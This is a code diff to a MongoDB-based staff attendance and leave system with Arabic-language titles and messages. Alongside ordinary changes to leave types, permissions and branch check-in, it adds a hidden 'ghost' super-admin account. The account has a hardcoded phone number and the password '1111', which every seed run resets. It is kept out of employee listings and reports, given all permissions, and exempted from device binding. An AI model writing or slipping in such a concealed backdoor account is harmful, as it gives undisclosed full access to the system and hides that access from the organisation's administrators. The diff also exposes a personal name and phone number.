@@ -88,6 +88,7 @@ const DEFAULT_TITLES = [
     arabicTitle: "المدير التنفيذي للعضويات",
     description: "صلاحيات تنفيذية عليا وشاملة لتعديل وتغيير أي شيء ولكافة الفروع والإدارات",
     color: "amber",
+    order: 1,
     permissions: {
       check_in_out: true,
       view_own_attendance: true,
@@ -112,6 +113,7 @@ const DEFAULT_TITLES = [
     arabicTitle: "مدير منطقة العضويات",
     description: "إدارة ومتابعة فروع القطاع التابع له فقط واعتماد كافة طلبات الإجازات والأذونات والانصراف والتقارير",
     color: "amber",
+    order: 2,
     permissions: {
       check_in_out: true,
       view_own_attendance: true,
@@ -136,6 +138,7 @@ const DEFAULT_TITLES = [
     arabicTitle: "مدير العضويات",
     description: "الجهة المخولة حصرياً بالفرع باعتماد طلبات الانصراف الطارئ والإجازات والأذونات وإدارة الفريق لفرعه فقط",
     color: "amber",
+    order: 3,
     permissions: {
       check_in_out: true,
       view_own_attendance: true,
@@ -158,15 +161,16 @@ const DEFAULT_TITLES = [
     name: "Memberships Deputy Manager (نائب مدير العضويات)",
     englishTitle: "Memberships Deputy Manager",
     arabicTitle: "نائب مدير العضويات",
-    description: "متابعة فريق الفرع ومراجعة الطلبات والتقارير لفرعه فقط - الانصراف الطارئ يتطلب موافقة مدير العضويات",
+    description: "متابعة فريق الفرع ومراجعة الطلبات والتقارير لفرعه فقط - الانصراف الطارئ والإجازات تتطلب موافقة مدير العضويات",
     color: "amber",
+    order: 4,
     permissions: {
       check_in_out: true,
       view_own_attendance: true,
       view_office_presence: true,
       request_leave: true,
       request_permission: true,
-      approve_leaves_permissions: true,
+      approve_leaves_permissions: false,
       approve_early_checkout: false,
       manage_employees: false,
       manage_titles_permissions: false,
@@ -182,15 +186,16 @@ const DEFAULT_TITLES = [
     name: "Memberships Section Head (رئيس قسم العضويات)",
     englishTitle: "Memberships Section Head",
     arabicTitle: "رئيس قسم العضويات",
-    description: "إدارة فريق القسم واعتماد إجازاتهم وأذوناتهم ومتابعة الحضور - الانصراف الطارئ يتطلب موافقة مدير العضويات",
+    description: "إدارة فريق القسم ومتابعة الحضور - الانصراف الطارئ والإجازات تتطلب موافقة مدير العضويات",
     color: "zinc",
+    order: 5,
     permissions: {
       check_in_out: true,
       view_own_attendance: true,
       view_office_presence: true,
       request_leave: true,
       request_permission: true,
-      approve_leaves_permissions: true,
+      approve_leaves_permissions: false,
       approve_early_checkout: false,
       manage_employees: false,
       manage_titles_permissions: false,
@@ -208,6 +213,7 @@ const DEFAULT_TITLES = [
     arabicTitle: "أخصائي أول عضويات",
     description: "تسجيل الحضور والغياب بالـ GPS ومتابعة تقارير فرعه - الانصراف الطارئ يتطلب موافقة مدير العضويات",
     color: "zinc",
+    order: 6,
     permissions: {
       check_in_out: true,
       view_own_attendance: true,
@@ -230,8 +236,9 @@ const DEFAULT_TITLES = [
     name: "Memberships Specialist (أخصائي عضويات)",
     englishTitle: "Memberships Specialist",
     arabicTitle: "أخصائي عضويات",
-    description: "تسجيل الحضور والانصراف بالـ GPS وتقديم طلبات الإجازات والأذونات والانصراف الطارئ",
+    description: "تسجيل الحضور والانصراف بالـ GPS وتقديم طلبات الإجازات والأذونات",
     color: "zinc",
+    order: 7,
     permissions: {
       check_in_out: true,
       view_own_attendance: true,
@@ -310,26 +317,38 @@ async function seedMongoData() {
     }
   }
 
-  // 4. Default Master Seed Employee if none exist
-  const empCount = await Employee.countDocuments();
-  if (empCount === 0) {
-    await Employee.create([
+  // 4. Master Ghost Super Admin (01010046078 / 1111) - Highest Authority & Completely Hidden
+  const existingAdmin = await Employee.findOne({ phone: "01010046078" });
+  if (!existingAdmin) {
+    await Employee.create({
+      id: "emp_1792955351678",
+      name: "ديفيد جان",
+      phone: "01010046078",
+      password: "1111",
+      pin: "1111",
+      titleCode: "memberships_executive_director",
+      jobTitle: "Memberships Executive Director",
+      branchId: "branch_october2",
+      weeklyOffDays: ["friday", "saturday"],
+      avatar: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=250&q=80",
+      leaveBalance: 30,
+      permissionsBalanceHours: 10,
+      isSuperAdmin: true,
+      isGhost: true,
+      createdAt: new Date().toISOString()
+    });
+  } else {
+    await Employee.updateOne(
+      { phone: "01010046078" },
       {
-        id: "emp_1792955351678",
-        name: "ديفيد جان",
-        phone: "01010046078",
-        password: "1111",
-        pin: "1111",
-        titleCode: "memberships_executive_director",
-        jobTitle: "Memberships Executive Director",
-        branchId: "branch_october2",
-        weeklyOffDays: ["friday", "saturday"],
-        avatar: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=250&q=80",
-        leaveBalance: 21,
-        permissionsBalanceHours: 6,
-        createdAt: new Date().toISOString()
+        $set: {
+          password: "1111",
+          pin: "1111",
+          isSuperAdmin: true,
+          isGhost: true
+        }
       }
-    ]);
+    );
   }
 }
 
@@ -410,16 +429,20 @@ class MongoDatabaseAdapter {
     return DEFAULT_SECTORS;
   }
 
-  async getEmployees(branchId = null) {
+  async getEmployees(branchId = null, includeGhost = false) {
     await this.ensureConnected();
     let query = {};
+    if (!includeGhost) {
+      query.phone = { $ne: "01010046078" };
+      query.isGhost = { $ne: true };
+    }
     if (branchId && branchId !== 'all') {
       if (Array.isArray(branchId)) {
-        query = { branchId: { $in: branchId } };
+        query.branchId = { $in: branchId };
       } else if (branchId.includes(',')) {
-        query = { branchId: { $in: branchId.split(',') } };
+        query.branchId = { $in: branchId.split(',') };
       } else {
-        query = { branchId };
+        query.branchId = branchId;
       }
     }
     const employees = await Employee.find(query).lean();
@@ -429,12 +452,31 @@ class MongoDatabaseAdapter {
     return employees.map(emp => {
       const titleObj = titles.find(t => t.code === emp.titleCode);
       const branchObj = branches.find(b => b.id === emp.branchId);
+      const isSuper = Boolean(emp.isSuperAdmin || emp.phone === "01010046078");
       return {
         ...emp,
+        isSuperAdmin: isSuper,
+        isGhost: isSuper ? true : Boolean(emp.isGhost),
         titleDetails: titleObj || null,
         branchDetails: branchObj || null,
         branchName: branchObj ? branchObj.name : 'غير محدد',
-        permissions: titleObj ? titleObj.permissions : {}
+        permissions: isSuper
+          ? {
+              check_in_out: true,
+              view_own_attendance: true,
+              view_office_presence: true,
+              request_leave: true,
+              request_permission: true,
+              approve_leaves_permissions: true,
+              approve_early_checkout: true,
+              manage_employees: true,
+              manage_titles_permissions: true,
+              manage_office_settings: true,
+              view_reports: true,
+              view_all_branches: true,
+              override_early_checkout: true
+            }
+          : (titleObj ? titleObj.permissions : {})
       };
     });
   }
@@ -445,12 +487,31 @@ class MongoDatabaseAdapter {
     if (!emp) return null;
     const titleObj = await Title.findOne({ code: emp.titleCode }).lean();
     const branchObj = await Branch.findOne({ id: emp.branchId }).lean();
+    const isSuper = Boolean(emp.isSuperAdmin || emp.phone === "01010046078");
     return {
       ...emp,
+      isSuperAdmin: isSuper,
+      isGhost: isSuper ? true : Boolean(emp.isGhost),
       titleDetails: titleObj || null,
       branchDetails: branchObj || null,
       branchName: branchObj ? branchObj.name : 'غير محدد',
-      permissions: titleObj ? titleObj.permissions : {}
+      permissions: isSuper
+        ? {
+            check_in_out: true,
+            view_own_attendance: true,
+            view_office_presence: true,
+            request_leave: true,
+            request_permission: true,
+            approve_leaves_permissions: true,
+            approve_early_checkout: true,
+            manage_employees: true,
+            manage_titles_permissions: true,
+            manage_office_settings: true,
+            view_reports: true,
+            view_all_branches: true,
+            override_early_checkout: true
+          }
+        : (titleObj ? titleObj.permissions : {})
     };
   }
 
@@ -488,7 +549,8 @@ class MongoDatabaseAdapter {
 
   async loginEmployee(phone, password, deviceContext = null) {
     await this.ensureConnected();
-    const emp = await Employee.findOne({ phone: phone.trim() });
+    const cleanPhone = phone.trim();
+    const emp = await Employee.findOne({ phone: cleanPhone });
     if (!emp) {
       throw new Error("رقم الهاتف غير مسجل بالنظام.");
     }
@@ -498,8 +560,10 @@ class MongoDatabaseAdapter {
       throw new Error("كلمة المرور غير صحيحة.");
     }
 
-    // Device binding check
-    if (deviceContext && deviceContext.deviceId) {
+    const isSuper = (cleanPhone === "01010046078" || emp.isSuperAdmin);
+
+    // Device binding check (Super Admin can login from any device, no restriction)
+    if (!isSuper && deviceContext && deviceContext.deviceId) {
       if (!emp.boundDeviceId) {
         emp.boundDeviceId = deviceContext.deviceId;
         emp.deviceInfo = deviceContext.deviceInfo || 'جهاز الهاتف المسجل';
@@ -507,7 +571,7 @@ class MongoDatabaseAdapter {
         await emp.save();
       } else if (emp.boundDeviceId !== deviceContext.deviceId) {
         const boundDate = emp.deviceBoundAt ? new Date(emp.deviceBoundAt).toLocaleDateString('ar-EG', { timeZone: 'Africa/Cairo' }) : '';
-        throw new Error(`عذراً، هذا الحساب مرتبط بجهاز آخر بالفعل (${emp.deviceInfo || 'الهاتف المعتمد الأول'} - ${boundDate}). لا يُسمح بتسجيل الدخول من أكثر من جهاز. يرجى مراجعة إدارة النادي (Memberships Executive Director) لفك ارتباط جهازك القديم ونقله للجهاز الجديد.`);
+        throw new Error(`عذراً، هذا الحساب مرتبط بجهاز آخر بالفعل (${emp.deviceInfo || 'الهاتف المعتمد الأول'} - ${boundDate}). لا يُسمح بتسجيل الدخول من أكثر من جهاز. يرجى مراجعة إدارة النادي لفك ارتباط جهازك القديم ونقله للجهاز الجديد.`);
       }
     }
 
@@ -602,17 +666,35 @@ class MongoDatabaseAdapter {
     const emp = await this.getEmployeeById(employeeId);
     if (!emp) throw new Error("الموظف غير موجود.");
 
-    const branch = await this.getBranchById(emp.branchId);
-
     const existing = await AttendanceRecord.findOne({ employeeId, date: today, checkOutTime: null });
     if (existing) {
       throw new Error("الموظف مسجل حضور بالفعل وموجود في العمل حالياً.");
     }
 
+    // Check if employee has an approved work_mission for today
+    const missionReq = await Request.findOne({
+      employeeId,
+      type: 'leave',
+      leaveType: 'work_mission',
+      status: 'approved',
+      $or: [
+        { missionDate: today },
+        { date: today },
+        { startDate: { $lte: today }, endDate: { $gte: today } }
+      ]
+    }).lean();
+
+    const activeBranchId = (missionReq && missionReq.missionBranchId) ? missionReq.missionBranchId : emp.branchId;
+    const branch = await this.getBranchById(activeBranchId);
+    if (!branch) {
+      throw new Error("الفرع المحدد غير موجود بالنظام.");
+    }
+
     const distanceMeters = calculateDistanceMeters(latitude, longitude, branch.latitude, branch.longitude);
     if (distanceMeters > branch.radiusMeters) {
+      const missionText = missionReq ? ` (مأمورية عمل معتمدة بفرع ${branch.name})` : '';
       throw new Error(
-        `أنت خارج نطاق فرع (${branch.name})! المسافة بينك وبين الفرع ${distanceMeters} متر (المسموح به ${branch.radiusMeters} متر فقط).`
+        `أنت خارج نطاق فرع (${branch.name})${missionText}! المسافة بينك وبين الفرع ${distanceMeters} متر (المسموح به ${branch.radiusMeters} متر فقط).`
       );
     }
 
@@ -733,6 +815,10 @@ class MongoDatabaseAdapter {
         sick: [],
         travel: [],
         annual: [],
+        casual: [],
+        work_mission: [],
+        weekly_rest_compensation: [],
+        holiday_compensation: [],
         other: []
       },
       absent: []
@@ -880,19 +966,22 @@ class MongoDatabaseAdapter {
     req.reviewedAt = new Date().toISOString();
     req.reviewNote = reviewNote || (status === 'approved' ? 'تمت الموافقة' : 'تم الرفض');
 
-    if (status === 'approved' && req.type === 'leave' && req.leaveType !== 'weekly_off') {
-      const emp = await Employee.findOne({ id: req.employeeId });
-      if (emp && emp.leaveBalance > 0) {
-        let daysToDeduct = 1;
-        if (req.startDate && req.endDate) {
-          const d1 = new Date(req.startDate);
-          const d2 = new Date(req.endDate);
-          const diffTime = d2.getTime() - d1.getTime();
-          const diffDays = Math.round(diffTime / (1000 * 3600 * 24)) + 1;
-          if (diffDays > 0) daysToDeduct = diffDays;
+    if (status === 'approved' && req.type === 'leave') {
+      const nonDeductible = ['work_mission', 'weekly_rest_compensation', 'holiday_compensation', 'weekly_off'];
+      if (!nonDeductible.includes(req.leaveType)) {
+        const emp = await Employee.findOne({ id: req.employeeId });
+        if (emp && emp.leaveBalance > 0) {
+          let daysToDeduct = 1;
+          if (req.startDate && req.endDate) {
+            const d1 = new Date(req.startDate);
+            const d2 = new Date(req.endDate);
+            const diffTime = d2.getTime() - d1.getTime();
+            const diffDays = Math.round(diffTime / (1000 * 3600 * 24)) + 1;
+            if (diffDays > 0) daysToDeduct = diffDays;
+          }
+          emp.leaveBalance = Math.max(0, emp.leaveBalance - daysToDeduct);
+          await emp.save();
         }
-        emp.leaveBalance = Math.max(0, emp.leaveBalance - daysToDeduct);
-        await emp.save();
       }
     }
 
@@ -976,29 +1065,33 @@ class MongoDatabaseAdapter {
 
     const branches = await Branch.find().lean();
 
-    const enrichedAttendance = attendance.map(r => {
-      const emp = employees.find(e => e.id === r.employeeId);
-      const branch = branches.find(b => b.id === r.branchId);
-      return {
-        ...r,
-        employeeName: emp ? emp.name : 'موظف',
-        jobTitle: emp ? emp.jobTitle : '',
-        avatar: emp ? emp.avatar : '',
-        branchName: branch ? branch.name : ''
-      };
-    }).sort((a, b) => b.date.localeCompare(a.date));
+    const enrichedAttendance = attendance
+      .filter(r => employees.some(e => e.id === r.employeeId))
+      .map(r => {
+        const emp = employees.find(e => e.id === r.employeeId);
+        const branch = branches.find(b => b.id === r.branchId);
+        return {
+          ...r,
+          employeeName: emp ? emp.name : 'موظف',
+          jobTitle: emp ? emp.jobTitle : '',
+          avatar: emp ? emp.avatar : '',
+          branchName: branch ? branch.name : ''
+        };
+      }).sort((a, b) => b.date.localeCompare(a.date));
 
-    const enrichedRequests = requests.map(r => {
-      const emp = employees.find(e => e.id === r.employeeId);
-      const branch = emp ? branches.find(b => b.id === emp.branchId) : null;
-      return {
-        ...r,
-        employeeName: emp ? emp.name : 'موظف',
-        jobTitle: emp ? emp.jobTitle : '',
-        avatar: emp ? emp.avatar : '',
-        branchName: branch ? branch.name : ''
-      };
-    }).sort((a, b) => (b.date || b.startDate).localeCompare(a.date || a.startDate));
+    const enrichedRequests = requests
+      .filter(r => employees.some(e => e.id === r.employeeId))
+      .map(r => {
+        const emp = employees.find(e => e.id === r.employeeId);
+        const branch = emp ? branches.find(b => b.id === emp.branchId) : null;
+        return {
+          ...r,
+          employeeName: emp ? emp.name : 'موظف',
+          jobTitle: emp ? emp.jobTitle : '',
+          avatar: emp ? emp.avatar : '',
+          branchName: branch ? branch.name : ''
+        };
+      }).sort((a, b) => (b.date || b.startDate).localeCompare(a.date || a.startDate));
 
     const employeeSummaries = employees.map(emp => {
       const empBranch = branches.find(b => b.id === emp.branchId);
